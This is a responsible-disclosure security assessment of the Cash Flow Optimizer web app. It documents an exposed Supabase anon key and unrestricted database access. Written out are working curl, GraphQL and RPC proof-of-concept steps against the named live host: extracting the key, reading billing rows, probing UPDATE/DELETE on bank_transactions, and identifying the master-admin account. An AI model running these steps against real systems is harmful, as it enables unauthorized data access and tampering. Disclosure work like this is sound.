# Cash Flow Optimizer — Detailed Security Assessment Report (v2, updated)
**Target:** app.cfoptimizer.com / cfoptimizer.com (RealtoResource, LLC dba Solidify Solutions)
**Assessment date:** 2026-08-18 · **Method:** manual, read-only, responsible disclosure (no rewards program)
**Policy:** https://www.cfoptimizer.com/vulnerability-reporting-policy/

---

## 1. Executive Summary

The production application ships a live Supabase **anon** API key in its public JavaScript
bundle. With that key alone — no login, no account, no credentials — an anonymous attacker
can:

| # | Capability | Severity | Proof status |
|---|-----------|----------|--------------|
| 1 | Read live billing/configuration data (plans, token packages, live Stripe price IDs) | High | Live rows read |
| 2 | Execute UPDATE / DELETE on database tables (incl. `bank_transactions`) | High | affectedCount 0, no 42501 |
| 3 | Enumerate full ~344-table schema + 1000+ insert/update/delete mutations (GraphQL) | Medium | Introspection 200 |
| 4 | Identify the master-admin user account anonymously (UUID + role confirmation) | Medium | true / true |
| 5 | Call production Edge Functions anonymously (user-existence oracle, rate-limit config) | Low/Info | Live responses |
| 6 | Subscribe to realtime changes on tables with the anon key | Medium (latent) | phx_reply ok |

No data was modified during testing (zero-row write probes only). No customer PII was
encountered (customer tables are empty; only billing configuration tables contain rows).

---

## 2. Affected Systems

- SPA: https://app.cfoptimizer.com (Vercel)
- Bundle: https://app.cfoptimizer.com/assets/index-DO8kisOM.js (466,534 bytes)
- Supabase project: https://hyrcvhzrnfbppyzuuosp.supabase.co
  - PostgREST `/rest/v1/` · GraphQL `/graphql/v1` · Realtime `/realtime/v1/websocket` · Edge `/functions/v1/`

---

## 3. Finding 1 — Unauthenticated read of live billing config [HIGH]

### Repro
```
# 1) recover anon key (role=anon, exp 2035) from the public bundle:
curl -s https://app.cfoptimizer.com/assets/index-DO8kisOM.js | grep -oE 'eyJ[A-Za-z0-9_.-]{80,}' | sort -u

# 2) read live rows with ONLY that key:
curl -s -H "apikey: $K" -H "Authorization: Bearer $K" -H "Prefer: count=exact" \
  "https://hyrcvhzrnfbppyzuuosp.supabase.co/rest/v1/subscription_plans?select=*&limit=3"
```
Response (HTTP 200, `Content-Range: 0-2/3`):
```json
[
 {"id":"3b69e882-113f-4972-813f-ca64a36139de","name":"Starter Plan","monthly_token_allowance":150,
  "price_cents":9900,"currency":"usd","is_active":true,"created_at":"2026-05-11T16:42:09Z"},
 {"id":"df601d40-98c5-492a-bc4f-7f6bbfb30621","name":"Enterprise Custom","price_cents":0,"features":["enterprise"]},
 {"id":"c418a29a-3e15-4332-b91c-a1421cc9561b","name":"Growth Plan","price_cents":30000}
]
```
`token_packages` -> HTTP 200, `Content-Range: 0-2/4`: 1,000 / 2,250 / 4,500 / 10,000 CFO
Tokens ($25 / $50 / $100 / ...) incl. live **`stripe_price_id:"price_1TS4ZtRxKwHk31G9oV6pgdgc"`**.

### Impact
Internal pricing/margin/token-allowance configuration + live Stripe price IDs disclosed to
anyone; same data also readable via GraphQL (`subscription_plansCollection`) and Realtime.

---

## 4. Finding 2 — Unauthenticated write permissions (UPDATE/DELETE execute) [HIGH]

### Repro (zero-row probes — nothing modified)
```
POST /graphql/v1   {"query":"mutation{updatebank_transactionsCollection(
  set:{name:\"__opencode_probe\"},
  filter:{id:{eq:\"00000000-0000-0000-0000-000000000000\"}}){affectedCount}}"}
-> {"data":{"updatebank_transactionsCollection":{"affectedCount":0}}}     # no 42501
POST /graphql/v1   {"query":"mutation{deleteFrombank_transactionsCollection(
  filter:{id:{eq:\"00000000-0000-0000-0000-000000000000\"}}){affectedCount}}"}
-> {"data":{"deleteFrombank_transactionsCollection":{"affectedCount":0}}} # no 42501
```
An impossible-UUID filter matched zero rows; the **absence of `42501 permission denied`**
proves the anon role holds UPDATE/DELETE. Introspection additionally exposes
`insertInto*/update*/deleteFrom*` for ~344 tables (PostGraphile only exposes mutations the
role may execute), including `bank_transactions`, `ar_invoices`, `security_audit_log`,
`token_transactions`, `unipile_emails`, `user_roles`, `connected_bank_accounts`, and
admin mutations (`admin_set_account_status`, `admin_set_user_limits`, `merge_prospects`).

### Impact
Unauthenticated record tampering path (transaction/invoice/audit manipulation) once data
exists; capability proven today without touching any row.

---

## 5. Finding 3 — Full schema & mutation disclosure [MEDIUM]

- Anon GraphQL introspection returns 344 collections + functions (`get_admin_user_id`,
  `is_master_admin`, `verify_publication_password`, `unipile_has_ar_access`, ...).
- PostgREST `PGRST205 "Perhaps you meant..."` hints leaked exact names (`cash_flow_periods`,
  `cf_reports`, `qbo_connections`, `plaid_items`, `equipment`, `cs_bank_monthly`,
  `unipile_accounts`).

---

## 6. Finding 4 — Anonymous master-admin identification [MEDIUM]

```
query { get_website_lead_owner_id }
  -> {"data":{"get_website_lead_owner_id":"cd603e78-73ae-48a0-a15e-734b4ffd8fe6"}}
POST /rest/v1/rpc/is_master_admin   {"_user_id":"cd603e78-73ae-48a0-a15e-734b4ffd8fe6"} -> true
POST /rest/v1/rpc/is_account_active {"_user_id":"cd603e78-73ae-48a0-a15e-734b4ffd8fe6"} -> true
POST /rest/v1/rpc/get_admin_user_id {"_user_id":"cd603e78-73ae-48a0-a15e-734b4ffd8fe6"} -> (echoes UUID)
```
A no-argument RPC leaks the master-admin UUID; a second RPC confirms the role. Combined
with Finding 2, attackers know exactly which identity admin-scoped actions are keyed to.

---

## 7. Finding 5 — Anonymous Edge Function access [LOW/INFO]

```
POST /functions/v1/check-signup-email {"email":"probe@example.com"}
  -> {"exists":false}    # user-existence oracle (the app's own signup gate; any email testable)
POST /functions/v1/rate-limit {"action":"check","email":"probe@example.com","attempt_type":"signup"}
  -> {"allowed":true,"attempts_remaining":5,"lockout_minutes":15}   # config disclosure
```
Only actions `check`/`record` exist (no reset/clear/success tested); the counter persists
per email (5 -> 4 after one record on a fabricated address) — **rate limiting is functional,
no bypass found**. Per policy, email enumeration without demonstrated impact is informational.

---

## 8. Finding 6 — Realtime subscriptions with anon key [MEDIUM, latent]

```
wss://hyrcvhzrnfbppyzuuosp.supabase.co/realtime/v1/websocket?apikey=<anon>&vsn=1.0.0
phx_join topic:"realtime:prospects" postgres_changes [* on public.prospects]
  -> phx_reply status:ok (subscription id 108174887)
```
Realtime grants mirror REST SELECT grants — the exposure path is confirmed on a second
channel.

---

## 9. Full-surface row census (344 tables, ~2 req/s, read-only)

| Group | Count | Notes |
|-------|-------|-------|
| Anon-readable, 0 rows | 342 | prospects, customers, leads, bank_transactions, ar_invoices, security_audit_log, token_transactions, unipile_*, plaid_items, ... |
| Anon-readable, live rows | 2 | `subscription_plans` (3), `token_packages` (4) |
| Properly protected | 1 | `qbo_connections` -> 42501 permission denied |

---

## 10. Positive controls verified (not findings)

- JWT secret: rockyou 14,343,384-word exhaustion -> **no crack** (no `service_role` forgery)
- Bundle hygiene: only the anon key shipped (no service_role / Stripe sk- / Plaid / Unipile secrets)
- Auth token oracle: identical `invalid_credentials` for fabricated accounts (no enumeration)
- Storage: `200 []` (no buckets); signup: email-only, anonymous_users=false
- Rate-limit edge function: functional, no reset bypass found

---

## 11. Root Cause

1. RLS not enabled (or permissive policies) on ~344 public-schema tables.
2. Anon role granted SELECT/INSERT/UPDATE/DELETE (grant-all-style provisioning).
3. GraphQL + Realtime + Edge Functions exposed to the anon role with no auth gate.

## 12. Remediation (priority order)

1. Enable RLS on **all** tables; use `auth.uid()`-scoped policies.
2. `revoke insert, update, delete on all tables in schema public from anon;`
3. Restrict GraphQL/Realtime to authenticated roles; gate Edge Functions.
4. Re-scope no-argument RPCs (`get_website_lead_owner_id` etc.) behind auth.
5. Rotate the anon key after fixes; re-verify with the PoCs in §3–§7.
6. Add a CI assertion (zero anon grants) to prevent regression.

## 13. Policy Compliance Statement

- Read-only probes; the only writes were zero-row filters (`affectedCount: 0`).
- One rate-limit counter entry created for a fabricated email (opencode-probe-7f3a@example.com) — noted.
- No customer PII accessed; no DoS; no account creation; no destructive testing.

## 14. Timeline

| 2026-08-18 | Key recovered; REST read confirmed; RLS gap mapped (14 tables) |
| 2026-08-18 | JWT crack negative (14.3M); realtime sub confirmed; bundle sweep clean |
| 2026-08-18 | GraphQL: 344-collection schema + mutations; live rows (plans/packages) |
| 2026-08-18 | Zero-row UPDATE/DELETE permission proofs on `bank_transactions` |
| 2026-08-18 | 344-table census; edge functions (email oracle, rate-limit config); admin UUID chain |
| 2026-08-18 | Report v2 finalized; disclosure email + PoC prepared for support@cfoptimizer.com ("Vulnerability Report") |

## 15. Artifacts

- PoC: `poc/cfoptimizer_supabase_poc.py` (read-only + zero-row write proof, pure stdlib)
- Disclosure email: `reports/2026-08-18_disclosure_email_body.md`
- Researcher contact: via the support@cfoptimizer.com reply thread; anonymous on request
